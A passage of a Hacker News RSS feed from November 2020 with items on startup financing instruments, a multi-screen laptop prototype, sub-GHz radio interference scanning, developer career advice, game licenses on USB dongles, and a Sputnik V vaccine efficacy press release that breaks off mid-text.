rights.</p></div><div><p>Liquidation preference</p><p><span>Yes.</span> Same terms as the new investor (usually 1x non-participating).</p><p><span>Yes.</span> 1x non-participating with the same seniority level as similar SAFEs in the liquidation waterfall.</p></div><div><p>Dilution for Existing Shareholders</p><p><span>Incremental.</span> Every new SAFE issued dilutes existing stockholders, often significantly, as they are the only being diluted. It’s not uncommon for founders to realize at the time of conversion that they have lost 40 to 50% of their equity after multiple rounds of SAFEs prior to a priced round.</p><p><span>Fixed.</span> Your CAFE offering has a fixed equity percentage allocation so the  dilution for existing shareholders is known and fixed, no matter how much capital you end up raising via your CAFE offering. You stay in control.</p></div><div><p>Dilution for SAFE holders</p><p><span>Pre-equity financing: No dilution.</span> Post-Money SAFE holders (the more common form of SAFEs today) do not get diluted by new SAFE issued by the company, existing shareholders (i.e. the founders) do.</p></div><div><p><span>Post-equity financing: Normal dilution.</span> Once SAFEs convert to equity, SAFE holders get diluted every time a new equity financing event occurs. The only way to not get diluted is to (i) have pro-rata rights (ii) reinvest at every round</p></div><div><p>Dilution for CAFE holders</p><p><span>No dilution from equity financing.</span> A CAFE offering has a fixed target equity percentage allocation, making it naturally anti-dilutive. So, collectively, all CAFE holders will not be diluted even if the company raises more equity financing rounds.</p></div><div><p><span>Predictable dilution from new CAFE investors.</span> A CAFE holder, taken individually, gets diluted each time a new CAFE is issued.</p></div></div></div></div><div id="for-investors"><div id="why-cafe-good-investors"><div><ul><li><p><b>Liquidity.</b> First and foremost, the CAFE gives investors a clearer path to liquidity. Unlike …</p></li></ul></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fairmint.co/cafe-continuous-agreement-for-future-equity/">https://fairmint.co/cafe-continuous-agreement-for-future-equity/</a></em></p>]]>
            </description>
            <link>https://fairmint.co/cafe-continuous-agreement-for-future-equity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199610</guid>
            <pubDate>Tue, 24 Nov 2020 16:02:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Aurora 7 Prototype – 7 Screen Laptop]]>
            </title>
            <description>
<![CDATA[
Score 180 | Comments 171 (<a href="https://news.ycombinator.com/item?id=25199499">thread link</a>) | @882542F3884314B
<br/>
November 24, 2020 | https://expanscape.com/the-aurora-7-prototype/the-story-of-the-aurora-7/ | <a href="https://web.archive.org/web/*/https://expanscape.com/the-aurora-7-prototype/the-story-of-the-aurora-7/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="Actual_Page_Container">

<!-- REVOLUTION SLIDER -->

<!-- /REVOLUTION SLIDER --><!-- -->

<section>
<div>





<h2>Prototype Objective Summary:</h2>

<p>Very simple :) - Design and build a proper mobile Security Operations Center.</p>

<p>I always knew this would be an ambitious undertaking. Power considerations, structural rigidity, actual portability and the ability to be easily and quickly compactible were priorities. For a further break down of the objectives please read on.</p>



<h2>Prototype Objective Breakdown and Achievement percentage:</h2>

<p>This is a breakdown of the objectives. It also shows how much of the objective in percentage was achieved with the Aurora 7 Prototype.</p>

<div>


<div><p><label><span>100%</span> 6 Cores or more at 5GHZ capability </label></p>
</div>

<div><p><label><span>100%</span> Fully integrated Multi Touch Screen in Palm rest </label></p>
</div>

<div><p><label><span>100%</span> 4 x 17.3 UHD/4K Screens </label></p>
</div>

<div><p><label><span>70%</span> Ability to easily replace parts </label></p>
</div>

<div><p><label><span>70%</span> Ability to swap wiring and parts with easily attainable parts </label></p>
</div>

<div><p><label><span>90%</span> Rechargeable battery system fully self contained </label></p>
</div>

<div><p><label><span>70%</span> Easily Replaceable batteries </label></p>
</div>



<div><p><label><span>100%</span> NVIDIA GTX 10 Series Graphics </label></p>
</div>

<div><p><label><span>100%</span> Separate Programmable System Monitor LCD </label></p>
</div>

<div><p><label><span>100%</span> User/Arduino accessible Embedded Microcontroller. </label></p>
</div>





<div><p><label><span>100%</span> Ability to fold down compactly to facilitate travel </label></p>
</div>

<div><p><label><span>100%</span> Full NO-NONSENSE 104 Key tactile backlit Keyboard. </label></p>
</div>

<div><p><label><span>80%</span> Overall Structural Rigidity </label></p>
</div>



<div><p><label><span>100%</span> Everything folds or swivels out of the primary chassis (NO appendages) </label></p>
</div>



<div><p><label><span>100%</span> Out of band always visible battery gauge </label></p>
</div>



<div><p><label><span>100%</span> More than 16TB SSD Storage potential </label></p>
</div>
</div>

</div>
</section>

</div></div>]]>
            </description>
            <link>https://expanscape.com/the-aurora-7-prototype/the-story-of-the-aurora-7/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199499</guid>
            <pubDate>Tue, 24 Nov 2020 15:50:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No Unique Messages. Only Unique Messengers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199481">thread link</a>) | @dbustac
<br/>
November 24, 2020 | https://danielbusta.com/message/ | <a href="https://web.archive.org/web/*/https://danielbusta.com/message/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://danielbusta.com/message/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199481</guid>
            <pubDate>Tue, 24 Nov 2020 15:48:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Seeing the invisible: radio interference on the 868 / 915 MHz frequency bands]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25199382">thread link</a>) | @adunk
<br/>
November 24, 2020 | https://www.thingsquare.com/blog/articles/sub-1-ghz-channel-noise/ | <a href="https://web.archive.org/web/*/https://www.thingsquare.com/blog/articles/sub-1-ghz-channel-noise/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <section><p>IoT (Internet of Things) devices are almost always&nbsp;wireless.</p>
<p>This means that they depend completely on the quality of the wireless&nbsp;communication.</p>
<p>Poor quality means bad connectivity. High quality means good&nbsp;connectivity.</p>
<p>Poor quality typically means that there is too much interference – <a href="https://en.wikipedia.org/wiki/Channel_noise_level" target="_blank">noise</a> – in the air. In the <a href="https://www.thingsquare.com/iot-platform/" target="_blank">Thingsquare IoT platform</a>, we use <a href="https://www.thingsquare.com/blog/articles/channel-hopping/" target="_blank">channel hopping</a> to avoid channels that have too much&nbsp;interference.</p>
<p>But how does the system know which channels are interfered more than&nbsp;others?</p>
<p>Enter <strong>channel scanning</strong>.</p>
<p>Channel scanning measures how much energy there is on each wireless radio&nbsp;channel.</p>
<p>When there it measures a high energy level on a channel, that means that there is noise on the channel. Noise that will interfere with our&nbsp;communication.</p>
<p>The channel scanner maintains a smoothed average of how noisy each channel is. This is called the <em>noise floor</em>. Devices will try to communicate less on channels where the noise floor is&nbsp;high.</p>
<p>But that’s not&nbsp;all.</p>
<p>The channel scanner can also be run in a mode where it continuously scans the channels and reports its findings back to the user. This makes the invisible radio waves visiable to our eyes. And we don’t even need to be physically&nbsp;present.</p>
<p>To see a device’s noise floor, all we have to do it ask&nbsp;it.</p>
<p>This is a typical nice and even noise&nbsp;floor:</p>
<div>
<div data-layout="grid" data-controls="#filterControls" data-animation="quicksand" data-x-gap="32" data-y-gap="32" data-media-queries="[
{&quot;width&quot;: 1500, &quot;cols&quot;: 1},
{&quot;width&quot;: 1100, &quot;cols&quot;: 1},
{&quot;width&quot;: 800, &quot;cols&quot;: 1},
{&quot;width&quot;: 480, &quot;cols&quot;: 1},
{&quot;width&quot;: 300, &quot;cols&quot;: 1}
]">
<div>
<p><small>
A good looking noise floor on the 868 MHz band.
</small>
</p>
</div>
</div>
</div>

<p>This is fairly evenly distributed across the&nbsp;channels.</p>
<p>By contrast, this is what the noise floor looks like if we have a rogue transmitter close to the channel&nbsp;scanner:</p>
<div>
<div data-layout="grid" data-controls="#filterControls" data-animation="quicksand" data-x-gap="32" data-y-gap="32" data-media-queries="[
{&quot;width&quot;: 1500, &quot;cols&quot;: 1},
{&quot;width&quot;: 1100, &quot;cols&quot;: 1},
{&quot;width&quot;: 800, &quot;cols&quot;: 1},
{&quot;width&quot;: 480, &quot;cols&quot;: 1},
{&quot;width&quot;: 300, &quot;cols&quot;: 1}
]">
<div>
<p><small>
The noise floor after placing a device that continuously sends a signal around 865 MHz.
</small>
</p>
</div>
</div>
</div>

<p>To make the above graph, we programmed a sub-GHz device to send a continuous signal on the 865 MHz band. This is only allowed to do during development – a deployed device must follow strict regulations about frequency use. More on this&nbsp;below.</p>
<div>
<div>
<div>
<div>
<div>
<div>
<div>
<figure>
<svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 8 8" style="enable-background:new 0 0 8 8;" space="preserve">
<path d="M3,1.3C2,1.7,1.2,2.7,1.2,3.6c0,0.2,0,0.4,0.1,0.5c0.2-0.2,0.5-0.3,0.9-0.3c0.8,0,1.5,0.6,1.5,1.5c0,0.9-0.7,1.5-1.5,1.5
C1.4,6.9,1,6.6,0.7,6.1C0.4,5.6,0.3,4.9,0.3,4.5c0-1.6,0.8-2.9,2.5-3.7L3,1.3z M7.1,1.3c-1,0.4-1.8,1.4-1.8,2.3
c0,0.2,0,0.4,0.1,0.5c0.2-0.2,0.5-0.3,0.9-0.3c0.8,0,1.5,0.6,1.5,1.5c0,0.9-0.7,1.5-1.5,1.5c-0.7,0-1.1-0.3-1.4-0.8
C4.4,5.6,4.4,4.9,4.4,4.5c0-1.6,0.8-2.9,2.5-3.7L7.1,1.3z"></path>
</svg>
</figure>
<blockquote>
Access points make particularly good channel scanners, because they have a quick connection to the backend.
</blockquote>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<h2 id="how-the-channel-scanner-works">How the Channel Scanner&nbsp;Works</h2>
<p>The channel scanner works by sweeping all the available channels – typically 50 – and measure the current signal strength on that&nbsp;channel.</p>
<p>This data is reported to the backend, which sends it to the user’s frontend. The frontend displays it in a nice-looking graph on the&nbsp;screen.</p>
<p>Although all devices maintain a noise floor and run the channel scanner, access points make particularly good scanners because they have fast connection to the&nbsp;backend.</p>
<p>The channel scanner will scan the frequency band that the access point is configured to operate on. So if it is configured for operating in the <span>US</span>, it will scan the 915 MHz band. In Europe, it scans the 868 MHz&nbsp;band.</p>
<p>This is what the channel scanner looks like in continuous scanning&nbsp;mode:</p>
<div>
<div data-layout="grid" data-controls="#filterControls" data-animation="quicksand" data-x-gap="32" data-y-gap="32" data-media-queries="[
{&quot;width&quot;: 1500, &quot;cols&quot;: 1},
{&quot;width&quot;: 1100, &quot;cols&quot;: 1},
{&quot;width&quot;: 800, &quot;cols&quot;: 1},
{&quot;width&quot;: 480, &quot;cols&quot;: 1},
{&quot;width&quot;: 300, &quot;cols&quot;: 1}
]">
<div>
<p><small>
Continuous noise sampling on the <span>EU</span> frequency band.
</small>
</p>
</div>
</div>
</div>


<h2 id="what-are-some-sources-of-channel-noise-in-the-wild-">What are some Sources of Channel Noise in the&nbsp;Wild?</h2>
<p>The most common source of channel noise is other devices that communicate on the 868 / 915 sub-GHz&nbsp;frequencies.</p>
<p>Every device that sends on the 868 / 915 MHz frequencies must adhere to strict&nbsp;regulations.</p>
<p>These regulations are maintained by <a href="https://www.etsi.org/" target="_blank"><span>ETSI</span></a> in the <span>EU</span> and <a href="https://www.fcc.gov/" target="_blank"><span>FCC</span></a> in the <span>US</span>. Even if the two regulatory bodies have slightly different rules, they both have a large&nbsp;overlap.</p>
<p>Devices&nbsp;must:</p>
<ul>
<li>Listen before they talk. If someone else is transmitting, they must wait until the other transmission is done before sending something&nbsp;themselves.</li>
<li>Switch channels often. No device may use their frequency for more than a couple of milliseconds. After that, they must switch to a different&nbsp;frequency.</li>
<li>Alternatively, communicate very&nbsp;seldomly. </li>
</ul>
<p>Because devices follow these rules, their wireless medium will mostly be&nbsp;available.</p>
<p>When another device transmits, only other devices of the same kind can understand what is being&nbsp;transmitted.</p>
<p>That is, a Thingsquare IoT device does not understand what an off-the-shelf garage door opener is&nbsp;saying.</p>
<p>To the Thingsquare device, the signal from the garage door opener will be just noise. Noise that is being picked up by the channel&nbsp;scanner.</p>
<p>And it isn’t just non-Thingsquare devices that will show up as&nbsp;noise.</p>
<p>If two Thingsquare networks are deployed at the same location, they will use different encryption keys and channel hopping schedules. So if they happen to hear a transmission from another device, the receiver will not be able to decrypt it. And so it will be interpreted as&nbsp;noise.</p>
<h2 id="conclusions">Conclusions</h2>
<p>Every <a href="https://www.thingsquare.com/iot-platform/">Thingsquare IoT device</a> runs a channel scanner that scans its sub-GHz bands to check for radio interference. The devices will then try to avoid channels with too much&nbsp;noise.</p>
<p>And by looking at what our devices’ channel scanners measure, we get a peek into the wireless conditions that we cannot see with our bare&nbsp;eyes.</p>
<p><small>Thingsquare builds IoT solutions with our customers with extremely robust sub-GHz wireless mesh networking – <a href="#" data-modal-target="#start">get in touch with us</a> to see how we can help you!</small></p>
</section>
        </div></div>]]>
            </description>
            <link>https://www.thingsquare.com/blog/articles/sub-1-ghz-channel-noise/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199382</guid>
            <pubDate>Tue, 24 Nov 2020 15:36:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Don't Work With Startups (Or FAANGs)]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25199374">thread link</a>) | @elliotbnvl
<br/>
November 24, 2020 | https://devcareer.elliotbonneville.com/no-startups-or-faangs | <a href="https://web.archive.org/web/*/https://devcareer.elliotbonneville.com/no-startups-or-faangs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-no-startups-or-faangs"><p><span><span>This chapter is not a hard and fast set of rules you should always abide by, but is some reasoning and facts that I’ve found to be true about picking a company to work for, while optimizing for a high rate, freedom, and flexibility.</span></span></p><p><span><span>The tl;dr version is that you shouldn’t work with startups, because they are high pressure and don’t pay well, and you shouldn’t work with household names (Facebook, Amazon, Google, Netflix, and their ilk) because they don’t provide as much flexibility.</span></span></p><p><span><span>Instead, you should target a sweet spot right in the middle, working with companies who have enough money to pay you well, but aren’t large enough and well-run enough that they can afford to be extremely exclusive and demanding of their employees.</span></span></p><p><span><span>As a side effect of their size, these companies often have pressing technical issues that are growing pains which haven’t been resolved yet that you can be of real value in solving. Working with them leads to doing high-value, satisfying work that pays well and affords you freedoms you wouldn’t otherwise find.</span></span></p><p><span><span>We’ll clear up some common misunderstandings and establish our reasoning by tackling this topic from first principles, as per usual.
</span></span></p><p><span><span><em>This post is an early release chapter of </em></span><span><em><a href="https://devcareer.elliotbonneville.com/">a book I'm writing in public</a></em></span><span><em>, working title of </em></span><span>Refactor Your Career</span><span><em>. If you're interested in following along for more prerelease chapters and other info, you can sign up for the newsletter below:</em></span></span></p><h2 id="block-b97dcd7b406e467b87a25fbcb87546ba"><span id="b97dcd7b406e467b87a25fbcb87546ba"></span><span><span>Don’t work with startups</span></span></h2><p><span><span>The definition of a startup is “a company prioritizing fast growth over everything else.”</span></span></p><p><span><span>Given the current economic incentive structure of the venture capital model, startups often take outside investment to grow more quickly.</span></span></p><p><span><span>As a result, startups typically optimize to get as much done with as little money and in as little time as possible, because they are not cash-flow positive and have limited financial runway.</span></span></p><p><span><span>Therefore, they are incentivized to find extremely high return-on-investment employees who will work long hours for little money. To find these employees, they will use a number of strategies:</span></span></p><ul><li id="block-53700a214aaf4831be4625f6876e0ed7"><span><span>Offer equity instead of cash compensation</span></span></li><li id="block-2b21919a7bb64e3e962a21fd7d352e42"><span><span>Offer “fun” benefits (beer, ping pong table, catered lunches, free movie tickets, etc.)</span></span></li><li id="block-bb36db0b8db44966b9505bbb5ec4ea1a"><span><span>Target young, talented, and hardworking engineers who are new to the industry and don’t have connections</span></span></li></ul><p><span><span>An extremely high return-on-investment employee is always getting the short end of the stick. The money has to come from somewhere, and in this case the money is coming from the employees’ pockets.</span></span></p><p><span><span>As an aside, your employer wins when they get the most bang for their buck, but the more bang they get for their buck, the less bang you get in return for the most valuable resource you possess -- your time.</span></span></p><p><span><span>At its core, hourly billing is a profoundly adversarial relationship, and you need to understand the rules by which it operates in order to not be taken advantage of. If you don’t know the rules of the game, you will lose. If you know the rules of the game and don’t play to them, you will lose. If you want to win, you must play intelligently, intentionally, and aggressively.</span></span></p><p><span><span>Hourly billing is just the beginning. As you grow in skill and “career capital” (c.f. </span><span><a href="https://www.amazon.com/Good-They-Cant-Ignore-You-ebook/dp/B0076DDBJ6" target="_blank" rel="noopener noreferrer"><em>So Good They Can’t Ignore You</em></a></span><span>, Cal Newport), you’ll want to explore ways to move away from hourly billing to a better way of billing, i.e. separating time worked from results delivered. Big benefits to you and your clients all the way around. Jonathan Stark writes eloquently on the issues with hourly billing </span><span><a href="https://jonathanstark.com/the-moral-dilemma-of-hourly-billing" target="_blank" rel="noopener noreferrer">here</a></span><span>.</span></span></p><p><span><span>Let’s take a deeper look at the strategies startups use to find employees, and why that means working for one is usually a bad strategy.</span></span></p><h3 id="block-5b675128f52f4bc7ae0ffadf51c842d9"><span id="5b675128f52f4bc7ae0ffadf51c842d9"></span><span><span>Taking equity is becoming a micro venture capitalist</span></span></h3><p><span><span>Venture capitalism is a bet on the future. Even the best venture capitalists lose money on most of their investments. They only turn a profit because they invest at scale and need just a couple of big wins per batch of investments in order to make up for that extremely high percentage of losses. They also study investing all day, every day, and are surrounded by people all doing the exact same thing.</span></span></p><p><span><span>Second, time is fungible. If you want, you can trade time for money directly (that’s what hourly billing is, after all). Therefore, an investment of time is an investment of your personal funds.</span></span></p><p><span><span>As a result, if you take equity compensation instead of cash when working at a startup, you are investing your money directly into that startup.</span></span></p><p><span><span>Given all of the above and bearing in mind that venture capitalism is a high risk bet that only works at scale for people who exclusively study how to invest, the odds that you are going to make a return on your investment with the limited amount of resources that you have to invest is vanishingly low.</span></span></p><p><span><span>Don’t try to play venture capitalist with the most valuable thing you have -- your time.</span></span></p><p><span><span><a href="https://www.jwz.org/about.html" target="_blank" rel="noopener noreferrer">Jamie Zawinski</a></span><span> (OG programmer, one of the founders of Netscape and Mozilla.org, the guy who probably wrote your screensaver, and now a dance club proprietor [yes, really]) has this to say about working for startups:</span></span></p><blockquote id="block-bf5cc1f488d24661902d79343aefc830"><span><span>Follow the... money. When a VC tells you what's good for you, check your wallet, then count your fingers.

He's telling you the story of, "If you bust your ass and don't sleep, you'll get rich" because the only way that people in his line of work get richer is if young, poorly-socialized, naive geniuses believe that story! Without those coat-tails to ride, VCs might have to work for a living. Once that kid burns out, they'll just slot a new one in.</span></span></blockquote><p><span><span>You can read the full post from 2011 </span><span><a href="https://www.jwz.org/blog/2011/11/watch-a-vc-use-my-name-to-sell-a-con/" target="_blank" rel="noopener noreferrer">here</a></span><span> and I highly encourage you to do so. It’s a zinger.</span></span></p><h3 id="block-ffa7baffd6a6461a9f9db8658d9237c6"><span id="ffa7baffd6a6461a9f9db8658d9237c6"></span><span><span>Empirically, equity is not as valuable as it seems</span></span></h3><p><span><span>Backing up the logic above, loose empirical analysis shows that if you look at total startup compensation as income combined with equity </span><span><em>adjusted for likelihood of realizing that equity’s value</em></span><span>, statistically you end up making less money in the end.</span></span></p><p><span><span>Patrick McKenzie, a well-known entrepreneur and prolific writer, and currently working at Stripe to “increase the GDP of the internet,” has this to say on the topic of valuing equity grants:</span></span></p><blockquote id="block-f861c0e363034719a6aa4cf4032f0005"><span><span>Roll d100. (Not the right kind of geek? Sorry. rand(100) then.)

0~70: Your equity grant is worth nothing.

71~94: Your equity grant is worth a lump sum of money which makes you about as much money as you gave up working for the startup, instead of working for a megacorp at a higher salary with better benefits.

95~99: Your equity grant is a lifechanging amount of money. You won’t feel rich — you’re not the richest person you know, because many of the people you spent the last several years with are now richer than you by definition — but your family will never again give you grief for not having gone into $FAVORED_FIELD like a proper $YOUR_INGROUP.

100: You worked at the next Google, and are rich beyond the dreams of avarice. Congratulations.

Perceptive readers will note that 100 does not actually show up on a d100 or rand(100).</span></span></blockquote><p><span><span>Dan Luu, another well-known developer and blogger, has this to say on the subject:</span></span></p><blockquote id="block-841b5199ddf14a02af23c89b2adf0131"><span><span>For a more serious take that gives approximately the same results, 80000 hours finds that the average value of a YC founder after 5-9 years is $18M. That sounds great! But there are a few things to keep in mind here. First, YC companies are unusually successful compared to the average startup. Second, in their analysis, 80000 hours notes that 80% of the money belongs to 0.5% of companies. Another 22% are worth enough that founder equity beats working for a big company, but that leaves 77.5% where that's not true.

If you're an employee and not a founder, the numbers look a lot worse. If you're a very early employee you'd be quite lucky to get 1/10th as much equity as a founder. If we guess that 30% of YC startups fail before hiring their first employee, that puts the mean equity offering at $1.8M / .7 = $2.6M. That's low enough that for 5-9 years of work, you really need to be in the 0.5% for the payoff to be substantially better than working at a big company unless the startup is paying a very generous salary.</span></span></blockquote><p><span><span>You can read the rest of Patrick’s post </span><span><a href="https://www.kalzumeus.com/2011/10/28/dont-call-yourself-a-programmer/" target="_blank" rel="noopener noreferrer">here</a></span><span>, and the rest of Dan’s post </span><span><a href="https://danluu.com/startup-tradeoffs/" target="_blank" rel="noopener noreferrer">here</a></span><span>. I highly recommend that you do so; they are erudite writers with a lot of insight into the industry.</span></span></p><h3 id="block-886c6f74b682471f90e8c002e01f09c9"><span id="886c6f74b682471f90e8c002e01f09c9"></span><span><span>Startup benefits are the cheese in the mousetrap</span></span></h3><p><span><span>While it might seem rather cynical, the benefits at a startup are just the cheese in the mousetrap. If you calculate the actual cash value of the benefits that many startups offer, you’ll find that they’re laughably low. Free beer, access to the company ping pong table (that never gets used), free movie tickets and a two hundred dollar per month business learning stipend actually work out to a relatively low amount of cold, </span><span><del>hard</del></span><span> mildly wrinkled Franklins.</span></span></p><p><span><span>Even things that are seemingly inherent to the unpurchasable, intangible benefits of startup culture like an open desk plan, brilliant and intense coworkers, and technically cutting-edge work can all be had elsewhere for a fraction of the time-cost of working at a startup if you’re willing to think outside the box.</span></span></p><p><span><span>Given that remaining within this particular box is so expensive, I highly encourage you not to do so without full understanding of what you’re doing.</span></span></p><p><span><span>If you can make $80/hr at a startup and $130/hr at a regular company, you are paying the startup $50/hr for the privilege of working there. For $50/hr, you can figure out a way to get most of the same benefits and come out way, way ahead.</span></span></p><p><span><span>Do what makes you happy, but do it with your eyes open. Also, if you really want to work at a startup, you might be better served by starting one.</span></span></p><h2 id="block-aebdc986fc9a4a39917e802441860771"><span id="aebdc986fc9a4a39917e802441860771"></span><span><span>Don’t work with household names</span></span></h2><p><span><span>There’s a word that gets tossed around a lot in the communities where developers that talk about their careers hang out (Hacker News, Reddit, et. al.) -- FAANG. It’s an acronym that refers to Facebook, Apple, Amazon, Netflix, and Google.</span></span></p><p><span><span>People talk about these companies (which pretty much are all out in Silicon Valley or in Seattle) so much that an acronym evolved as a catchall to refer to them. When I say “household name,” these are the companies …</span></span></p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcareer.elliotbonneville.com/no-startups-or-faangs">https://devcareer.elliotbonneville.com/no-startups-or-faangs</a></em></p>]]>
            </description>
            <link>https://devcareer.elliotbonneville.com/no-startups-or-faangs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199374</guid>
            <pubDate>Tue, 24 Nov 2020 15:35:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Disc as Dongle]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25199286">thread link</a>) | @mortenjorck
<br/>
November 24, 2020 | https://interuserface.net/2020/11/the-disc-as-dongle/ | <a href="https://web.archive.org/web/*/https://interuserface.net/2020/11/the-disc-as-dongle/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
          <!-- <style>
        body.single {
          background-color: #;
        }
      </style> -->
      <h3>November 23, 2020</h3>
      
      <p>One possible future of digital distribution is already here – in the guise of an existing format.</p>
      
<p><span>The industrial design</span> of the just-released Playstation 5 may be <a href="http://interuserface.net/2020/06/the-regressive-design-of-the-playstation-5/" data-type="post" data-id="633">regressive</a>, but it looks to the future in one critical way: Judging by the ungainly grafting-on of its disc drive, its original conception as a digital-only console is unmistakable.</p>



<p>For many, digital-only is a conflicting proposition. It curtails long-established freedoms of lending and resale, yet most would agree that it is also inevitably the future. But it doesn’t have to be the former. There is a solution – and it already exists.</p>



<p>The physical discs included with the retail versions of console games have served an increasingly marginal utility over the past console generation. Ever-larger day-one patches weigh in in the gigabytes. Triple-A games already require tens of gigabytes of data to be copied from the disc to the hard drive in order to manage load times, and the Playstation 5’s reliance on a super-fast SSD architecture only formalizes this. </p>



<hr>



<p><span>This leaves the disc</span> with precious little to actually do – it’s too slow to be played from, its data is often outdated by the time it’s installed, and as broadband speeds continue to inch upward, the read speed of even a modern Blu-ray drive is already slower than some fiber connections. Yet despite all this, the lowly disc still has one ace in the hole.</p>



<p>Even stripped of its value as a storage mechanism for game data, the disc serves a critical purpose: It is the physical manifestation of a license, an unencumbered and freely transferable token with which ownership of a game is immutably entangled. Future games could well ship with an essentially empty disc, relying on the network for everything else, yet the advantage of the disc-anchored license would remain undisputed. The disc allows one to, as memorably demonstrated in Sony’s 2013 response to Microsoft’s aborted digital-only Xbox play, simply <a href="https://www.polygon.com/2013/6/10/4417490/playstations-one-step-tutorial-on-sharing-used-games">hand that license to someone else.</a></p>



<hr>



<p><span>All this then invites the question:</span> Why does it have to be a <em>disc?</em> Why does a console need a noisy, mechanically complex, and expensive optical drive just to read a license? Professional software has long used USB peripherals, or dongles as they are semi-affectionately known, as the physical manifestation of licenses. The disc has become a dongle, so why not just use a dongle?</p>



<p>A few kilobytes and an encryption scheme are all that’s required to tie licenses to a physical device today. A tiny, inexpensive USB device could serve as the retail form factor for future games, ushering in an all-download future that retains nearly all the benefits of physical legacy formats. It could perhaps even, via firmware update, add “physical media” support to both the digital-only Playstation 5 and Xbox Series S.</p>
      <!-- <p class="metadata">
        Clayton Miller&ensp;&bull;&ensp;      </p> -->
      </article></div>]]>
            </description>
            <link>https://interuserface.net/2020/11/the-disc-as-dongle/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199286</guid>
            <pubDate>Tue, 24 Nov 2020 15:27:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interim analysis shows 91.4% efficacy for the Russian Sputnik vaccine]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199213">thread link</a>) | @yread
<br/>
November 24, 2020 | https://sputnikvaccine.com/newsroom/pressreleases/second-interim-analysis-of-clinical-trial-data-showed-a-91-4-efficacy-for-the-sputnik-v-vaccine-on-d/ | <a href="https://web.archive.org/web/*/https://sputnikvaccine.com/newsroom/pressreleases/second-interim-analysis-of-clinical-trial-data-showed-a-91-4-efficacy-for-the-sputnik-v-vaccine-on-d/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<ul>
<li>
<p>
<b><i>The efficacy of the Sputnik V vaccine is 91.4%, based on the second interim analysis of data obtained 28 days after administering the first dose</i></b> (7 days after the second dose).
</p>
<ul>
<li>
<p>
<b><i>Calculation was based on the analysis of data on volunteers (n = 18,794) who received both the first and second doses</i></b><i> of the Sputnik V vaccine or placebo at the second control point (39 confirmed cases as of November 23, 2020) in accordance with the clinical trial protocol. </i>
</p>
</li>
</ul>
</li>
<li>
<p>
<b><i>Preliminary data from volunteers obtained 42 days after the first dose</i></b><i> (corresponds with 21 days after the second dose) <b>indicates an efficacy of the vaccine above 95%.</b> </i>
</p>
</li>
<li>
<p>
<i>The <b>interim research data will be published by the Gamaleya Center team in one of the leading international peer-reviewed medical journals.</b> Following the completion of Phase III clinical trials of the Sputnik V vaccine, Gamaleya Center will provide access to the full clinical trial report.</i>
</p>
</li>
  
<li>
<p>
<i>Currently, 40,000 volunteers are taking part in the Phase III double-blind, randomized, placebo-controlled clinical post-registration study of the Sputnik V vaccine in Russia, of whom more than <b>22,000 volunteers were vaccinated with the first dose and more than 19,000 volunteers with the first and second doses</b>.</i>
</p>
</li>
<li>
<p>
<i>There were <b>no unexpected adverse events during the trials</b>. Monitoring of the participants is ongoing.</i>
</p>
</li>
<li>
<p>
<b><i>The Sputnik V vaccine is based on a well-studied human adenoviral vector platform that has proven safe and effective with no long-term side effects </i></b><i>in more than 250 clinical trials globally conducted during the past two decades - while the history of the use of human adenoviruses in vaccine development began in 1953. More than 100,000 people have received approved and registered drugs based on human adenoviral vectors.</i>
</p>
</li>
<li>
<p>
<b><i>The uniqueness of the Russian vaccine lies in the use of two different human adenoviral vectors</i></b><i> which allows for a stronger and longer-term immune response as compared to the vaccines using one and the same vector for two doses.</i>
</p>
</li>
</ul>
<p>
<b>Moscow, November 24, 2020 –</b><b> </b>The National Research Center for Epidemiology and Microbiology named after N.F. Gamaleya of the Ministry of Health of the Russian Federation (Gamaleya Center) and the Russian Direct Investment Fund (RDIF, Russia’s sovereign wealth fund), announce positive results obtained during the second interim data analysis of the largest double-blind, randomized, placebo-controlled Phase III clinical trials in Russia’s history involving 40,000 volunteers. Gamaleya Center experts have once again confirmed the high efficacy of the Sputnik V vaccine, the world’s first registered vaccine against coronavirus based on a well-studied platform of human adenoviral vectors. <b>Evaluation of efficacy was carried out among volunteers (n = 18,794) 28 days after receiving the first dose (7 days after the second dose) of the vaccine or placebo upon reaching the second check point of the trial in compliance with the clinical trial protocol. The analysis demonstrated a 91.4% efficacy rate for the Sputnik V vaccine. </b>
</p>
<div>
